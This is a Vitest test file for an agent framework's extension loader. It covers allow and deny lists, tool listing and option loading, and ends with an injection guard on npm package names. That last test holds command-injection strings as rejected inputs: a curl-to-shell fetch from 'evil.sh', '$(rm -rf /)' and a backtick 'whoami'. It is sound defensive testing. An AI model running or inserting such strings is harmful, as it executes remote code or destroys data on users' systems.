/**
 * Tests for ExtensionLoader
 */

import { describe, it, expect, beforeEach, vi } from 'vitest';
import { ExtensionLoader, isValidNpmPackageName } from '../ExtensionLoader';
import { ExtensionManager } from '../ExtensionManager';

describe('ExtensionLoader', () => {
  let loader: ExtensionLoader;
  let manager: ExtensionManager;

  beforeEach(() => {
    manager = new ExtensionManager({});
    loader = new ExtensionLoader(manager, {
      loadCurated: true,
      loadCommunity: false,
      autoInstall: false // Disable auto-install for tests
    });
  });
  
  describe('initialization', () => {
    it('should initialize with default config', () => {
      expect(loader).toBeDefined();
    });
    
    it('should respect whitelist configuration', () => {
      const customLoader = new ExtensionLoader(manager, {
        whitelist: ['@framers/agentos-ext-web-search']
      });
      
      // @ts-ignore - accessing private method for testing
      const shouldLoad = customLoader.shouldLoadExtension('@framers/agentos-ext-web-search');
      expect(shouldLoad).toBe(true);
      
      // @ts-ignore
      const shouldNotLoad = customLoader.shouldLoadExtension('@framers/agentos-other');
      expect(shouldNotLoad).toBe(false);
    });
    
    it('should respect blacklist configuration', () => {
      const customLoader = new ExtensionLoader(manager, {
        blacklist: ['@framers/agentos-dangerous']
      });
      
      // @ts-ignore
      const shouldNotLoad = customLoader.shouldLoadExtension('@framers/agentos-dangerous');
      expect(shouldNotLoad).toBe(false);
      
      // @ts-ignore
      const shouldLoad = customLoader.shouldLoadExtension('@framers/agentos-safe');
      expect(shouldLoad).toBe(true);
    });
  });
  
  describe('getAvailableTools', () => {
    it('should return empty array when no extensions loaded', () => {
      const tools = loader.getAvailableTools();
      expect(tools).toEqual([]);
    });
    
    it('should return tools from loaded extensions', async () => {
      // Mock a loaded extension
      const mockExtension = {
        name: 'test-extension',
        descriptors: [
          {
            id: 'testTool',
            kind: 'tool',
            payload: {
              id: 'testTool',
              name: 'Test Tool',
              displayName: 'Test Tool',
              description: 'A test tool',
              inputSchema: { type: 'object' },
              execute: vi.fn()
            }
          }
        ]
      };
      
      // @ts-ignore - accessing private property for testing
      loader.loadedExtensions.set('@framers/test-extension', mockExtension);
      
      const tools = loader.getAvailableTools();
      expect(tools).toHaveLength(1);
      expect(tools[0].id).toBe('testTool');
      expect(tools[0].name).toBe('Test Tool');
      expect(tools[0].extension).toBe('@framers/test-extension');
    });
  });
  
  describe('extension metadata', () => {
    it('should infer category from package name', () => {
      // @ts-ignore - accessing private method
      const category = loader.inferCategory('@framers/agentos-ext-web-search');
      expect(category).toBe('research');
      
      // @ts-ignore
      const intCategory = loader.inferCategory('@framers/agentos-integration-slack');
      expect(intCategory).toBe('integrations');
    });
    
    it('should get extension options from environment', () => {
      process.env.TELEGRAM_BOT_TOKEN = 'test-token';
      
      // @ts-ignore - accessing private method
      const options = loader.getExtensionOptions('@framers/agentos-ext-telegram');
      expect(options.botToken).toBe('test-token');
      
      delete process.env.TELEGRAM_BOT_TOKEN;
    });
  });
});

describe('isValidNpmPackageName (CR2 — RCE guard)', () => {
  it('accepts valid scoped + unscoped npm names', () => {
    expect(isValidNpmPackageName('@framers/agentos-ext-web-search')).toBe(true);
    expect(isValidNpmPackageName('lodash')).toBe(true);
    expect(isValidNpmPackageName('@scope/pkg.name-1')).toBe(true);
  });

  it('rejects names carrying shell metacharacters / injection payloads', () => {
    expect(isValidNpmPackageName('foo && curl evil.sh | sh')).toBe(false);
    expect(isValidNpmPackageName('$(rm -rf /)')).toBe(false);
    expect(isValidNpmPackageName('foo;bar')).toBe(false);
    expect(isValidNpmPackageName('foo`whoami`')).toBe(false);
    expect(isValidNpmPackageName('foo\nbar')).toBe(false);
    expect(isValidNpmPackageName('')).toBe(false);
  });
});
